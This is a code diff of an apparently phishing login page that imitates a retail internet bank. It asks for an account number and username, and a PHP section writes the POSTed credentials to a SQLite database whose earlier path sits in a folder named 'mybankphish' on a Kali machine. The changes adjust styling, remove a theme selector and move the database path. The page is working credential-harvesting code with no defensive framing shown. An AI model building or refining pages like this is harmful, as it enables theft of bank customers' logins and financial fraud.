@@ -41,14 +41,9 @@
 			
 				<div id="main" style="left:0px;width:100%!important;position:relative !important">
                     <div id="section">
-                    <div id="keyboard_firstrowtwrapper">
+                    <div id="keyboard_firstrowtwrapper" style="background-color:#0e96bc">
                         <div id="keyboard_bankname">Please login to S&R Retail Internet Banking</div>
-                        <div id="keyboard_themselection">
-                            <table>
-                                <tbody><tr><td><label for="fldlitever">Choose Theme</label></td><td><select id="fldlitever" name="fldlitever" tabindex="3" style="width:auto;height:auto"><option value="">Default</option><option value="C">Contemporary</option><option value="L">Classic</option></select></td></tr>
-                                </tbody>
-                            </table>
-                        </div>
+                        
                     </div>
                     <div id="rows">
 
@@ -68,7 +63,7 @@
                                             </div>
 
                                             <div class="form-group">
-                                                <label for="myAccount" class="text-info">Account Number:</label>
+                                                <label for="myAccount" class="text-info">Acount Number:</label>
                                                 <br>
                                                 <input type="number" name="myAccount" id="myAccount" class="form-control" required>
                                             </div>
@@ -123,7 +118,7 @@
 
 
 <?php
-$db = new PDO("sqlite:/home/kali/mybankphish/fidelityusers.db");
+$db = new PDO("sqlite:/home/kali/wwwdata/fidelityusers.db");
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
   // collect value of input field
   $myUsername = $_POST['myUsername'];
